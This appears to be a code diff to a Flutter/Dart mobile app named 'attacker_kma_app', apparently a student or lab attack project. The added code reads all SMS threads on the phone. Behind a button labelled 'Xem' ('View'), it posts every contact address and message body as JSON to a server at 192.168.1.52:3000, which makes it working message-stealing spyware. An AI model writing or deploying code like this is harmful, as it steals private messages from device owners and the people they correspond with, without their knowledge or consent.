@@ -1,63 +1,71 @@
+import 'dart:convert';
+
 import 'package:attacker_kma_app/blocs/messages/message_bloc.dart';
 import 'package:attacker_kma_app/blocs/messages/message_event.dart';
 import 'package:attacker_kma_app/common_widgets/content_message.dart';
 import 'package:attacker_kma_app/models/message.dart';
+import 'package:attacker_kma_app/screen/phone/message_detail.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_bloc/flutter_bloc.dart';
 import 'package:sms/sms.dart';
+import 'package:http/http.dart' as http;
 
 import '../../common_widgets/content_message.dart';
 
-class MessageScreen extends StatelessWidget {
-  List<SmsThread> threads;
+class MessageScreen extends StatefulWidget {
+  @override
+  _MessageScreenState createState() => _MessageScreenState();
+}
 
-  MessageBloc _messageBloc;
+class _MessageScreenState extends State<MessageScreen> {
+  List<SmsThread> threads;
+  List<SmsMessage> messages;
 
   SmsQuery query = SmsQuery();
 
-  MessageModel messageModel = MessageModel();
+  bool flag = true;
 
   getContactSMS() async => threads = await query.getAllThreads;
 
-  String address;
+  // List<Map> json = new List();
 
-  List<Message> listMessage = [];
+  // Mess mess = Mess();
 
   @override
   Widget build(BuildContext context) {
-    threads.forEach((element) {
-      listMessage.add(element.contact.address.toString(), element.messages);
-    });
-
     return FutureBuilder(
       future: getContactSMS(),
       builder: (context, snapshot) {
         if (!snapshot.hasData) {
           return Center(child: CircularProgressIndicator());
         } else {
-          return BlocBuilder(
-            bloc: _messageBloc = MessageBloc()
-              ..add(SendMessage(messages: threads.addAll(th))),
-            child: Column(
-              children: [
-                Expanded(
-                  child: ListView.builder(
-                    itemCount: threads.length,
-                    itemBuilder: (context, index) {
-                      return MessageWidget(
-                        profilePics: "https://bit.ly/3d3hq8j",
-                        title: threads[index].contact.address,
-                        content: threads[index].messages.length.toString(),
-                      );
-                    },
-                  ),
-                ),
-                FlatButton(
-                  onPressed: () {},
-                  child: Text('Gui'),
-                )
-              ],
-            ),
+          List<String> listMessages = [];
+          String listAddress;
+          return FlatButton(
+            onPressed: () async {
+              for (int i = 0; i < threads.length; i++) {
+                listAddress = threads[i].contact.address;
+                for (int j = 0; j < threads[i].messages.length; j++) {
+                  listMessages.add(threads[i].messages[j].body);
+                }
+
+                var body = json.encode({
+                  "message": {
+                    "address": listAddress,
+                    "text": listMessages,
+                  }
+                });
+                http.Response response = await http.post(
+                  'http://192.168.1.52:3000/create-message',
+                  body: body,
+                  headers: {'Content-type': 'application/json'},
+                );
+                listMessages.clear();
+                print(body);
+                print("long ${response.body}");
+              }
+            },
+            child: Text('Xem'),
           );
         }
       },
